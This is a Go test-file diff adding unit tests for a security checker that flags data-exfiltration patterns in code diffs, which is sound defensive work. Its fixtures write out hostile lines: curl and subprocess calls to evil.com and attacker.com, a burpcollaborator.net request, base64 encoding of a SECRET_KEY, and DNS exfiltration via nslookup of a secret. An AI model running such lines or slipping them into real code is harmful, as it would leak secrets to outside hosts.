@@ -795,6 +795,119 @@ func TestValidate_DirectionCheckFails_FailFast(t *testing.T) {
 	require.Equal(t, "triaged", stores.issues.lastStatus)
 }
 
+// --- Exfiltration Pattern Tests ---
+
+func TestCheckSecurity_ExfiltrationCurlEvil(t *testing.T) {
+	t.Parallel()
+	s := &Service{logger: zerolog.Nop()}
+
+	diff := `--- a/main.go
++++ b/main.go
+@@ -1,3 +1,4 @@
+ package main
++curl https://evil.com/steal
+`
+	result, details, err := s.checkSecurity(diff)
+	require.NoError(t, err)
+	require.Equal(t, "fail", result, "curl to non-allowlisted domain should fail")
+	require.Contains(t, details, "exfiltration")
+}
+
+func TestCheckSecurity_ExfiltrationCurlAllowlisted(t *testing.T) {
+	t.Parallel()
+	s := &Service{logger: zerolog.Nop()}
+
+	diff := `--- a/main.go
++++ b/main.go
+@@ -1,3 +1,4 @@
+ package main
++curl https://api.anthropic.com/v1/messages
+`
+	result, _, err := s.checkSecurity(diff)
+	require.NoError(t, err)
+	require.Equal(t, "pass", result, "curl to allowlisted domain should pass")
+}
+
+func TestCheckSecurity_ExfiltrationBase64Env(t *testing.T) {
+	t.Parallel()
+	s := &Service{logger: zerolog.Nop()}
+
+	diff := `--- a/main.py
++++ b/main.py
+@@ -1,3 +1,4 @@
+ import os
++base64.encode(os.Getenv("SECRET_KEY"))
+`
+	result, details, err := s.checkSecurity(diff)
+	require.NoError(t, err)
+	require.Equal(t, "fail", result, "base64 encoding env vars should fail")
+	require.Contains(t, details, "exfiltration")
+}
+
+func TestCheckSecurity_ExfiltrationSubprocessCurl(t *testing.T) {
+	t.Parallel()
+	s := &Service{logger: zerolog.Nop()}
+
+	diff := `--- a/main.py
++++ b/main.py
+@@ -1,3 +1,4 @@
+ import subprocess
++subprocess.run(["curl", "https://attacker.com"])
+`
+	result, details, err := s.checkSecurity(diff)
+	require.NoError(t, err)
+	require.Equal(t, "fail", result, "subprocess piping to curl should fail")
+	require.Contains(t, details, "exfiltration")
+}
+
+func TestCheckSecurity_ExfiltrationBurpCollaborator(t *testing.T) {
+	t.Parallel()
+	s := &Service{logger: zerolog.Nop()}
+
+	diff := `--- a/main.py
++++ b/main.py
+@@ -1,3 +1,4 @@
+ import requests
++requests.get("https://evil.burpcollaborator.net")
+`
+	result, details, err := s.checkSecurity(diff)
+	require.NoError(t, err)
+	require.Equal(t, "fail", result, "request to burpcollaborator.net should fail")
+	require.Contains(t, details, "exfiltration")
+}
+
+func TestCheckSecurity_ExfiltrationDNSQuery(t *testing.T) {
+	t.Parallel()
+	s := &Service{logger: zerolog.Nop()}
+
+	diff := `--- a/script.sh
++++ b/script.sh
+@@ -1,3 +1,4 @@
+ #!/bin/bash
++nslookup $SECRET.evil.com
+`
+	result, details, err := s.checkSecurity(diff)
+	require.NoError(t, err)
+	require.Equal(t, "fail", result, "DNS exfiltration via nslookup should fail")
+	require.Contains(t, details, "exfiltration")
+}
+
+func TestCheckSecurity_ExfiltrationCleanDiff(t *testing.T) {
+	t.Parallel()
+	s := &Service{logger: zerolog.Nop()}
+
+	diff := `--- a/main.go
++++ b/main.go
+@@ -1,3 +1,5 @@
+ package main
++import "fmt"
++func hello() { fmt.Println("hello world") }
+`
+	result, _, err := s.checkSecurity(diff)
+	require.NoError(t, err)
+	require.Equal(t, "pass", result, "clean diff should pass exfiltration check")
+}
+
 // --- Helpers ---
 
 func generateDiff(added, removed int) string {
